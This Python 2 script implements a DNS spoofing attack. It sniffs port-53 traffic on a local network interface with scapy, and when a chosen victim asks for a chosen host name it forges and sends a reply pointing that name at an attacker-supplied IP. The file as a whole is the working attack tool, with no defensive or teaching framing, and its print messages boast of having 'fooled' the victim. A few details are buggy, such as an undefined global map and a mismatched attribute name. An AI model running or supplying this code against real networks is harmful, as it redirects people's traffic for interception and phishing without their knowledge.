#!/usr/bin/python
import sys
import getopt
import scapy.all as scapy
import pcapy
from impacket.ImpactDecoder import EthDecoder, TCPDecoder, IPDecoder, UDPDecoder




def parse_host_file(my_file):
	for line in open(my_file):
		line = line.rstrip('\n')
		if line:
			(ip, host) = line.split()
			dns_map[host] = ip

class Dns_spoofing():
	def __init__(self):
		self.dev = "eth0"
		self.filt = "port 53"
		self.my_file= '/home/kevamo/Desktop/hosts'
		decoder = EthDecoder()
		self.dns_map = {}
		self.eth_decoder = EthDecoder()
		self.ip_decoder = IPDecoder()
		self.tcp_decoder = TCPDecoder()
		self.udp_decoder=UDPDecoder()

		#vriables to store target data
		self.victim_ip=''
		self.address_to_spoof=''
		self.self_fake_ip=''

		#sentinel to stop loop
		self.stop=''

	def handle_packet(self, packet):

		if self.stop != '':
			print 'stopping'
			exit()
		ip = packet.getlayer(scapy.IP)
		# if ip.src !='':
		# 	if ip.src != self.victim_ip:
		# 		return 0
		udp = packet.getlayer(scapy.UDP)
		dhcp = packet.getlayer(scapy.DHCP)
		dns=packet.getlayer(scapy.DNS)		
		# #take no action when the paket doesnt come from target victim
		# print str(self.victim_ip).strip() + " and ===> "+ str(ip.src).strip()

		if self.victim_ip != '':
			if str(self.victim_ip).strip() != str(ip.src).strip():
				return 0
		# print 'dns qr '+ str(dns.qr) +'  and opcode is  ' + str (dns.opcode)
		# print dns

		if dns.qr == 0 and dns.opcode == 0:
			queried_host = dns.qd.qname[:-1]
			resolved_ip = None
			if self.address_to_spoof !='':
				if str(queried_host).strip() != str(self.address_to_spoof).strip():
					#print 'The queried host is not our target i.e.  '+  str(queried_host).strip()+"and ===> "+ str(self.address_to_spoof).strip()
					return 0
			resolved_ip=self.fake_ip
			print "about to spoof queried host"+str(queried_host)+ " from source ip "+ str(ip.src) 
			if resolved_ip:
				#print "=======>"+str(resolved_ip)
				dns_answer = scapy.DNSRR(rrname=queried_host + ".",
					ttl=330,
					type="A",
					rclass="IN",
					rdata=resolved_ip)
				
				dns_reply = scapy.IP(src=ip.dst, dst=ip.src) / \
					scapy.UDP(sport=udp.dport,
					dport=udp.sport) / \
					scapy.DNS(
					id = dns.id,
					qr = 1,
					aa = 0,
					rcode = 0,
					qd = dns.qd,
					an = dns_answer
					)
				#print dns_reply
				
				print "\n\n fooled comp with ip %s that  server %s  has ip address %s \n\n" % (ip.src,
				queried_host, resolved_ip)
				scapy.send(dns_reply, iface=self.dev)
	def start(self, *args):
		try:
			self.victim_ip=args[0]
			self.address_to_spoof=args[1]
			self.fake_ip=args[2]
			scapy.sniff(iface=self.dev, filter=self.filt, prn=self.handle_packet)
		except Exception, e:
			print e







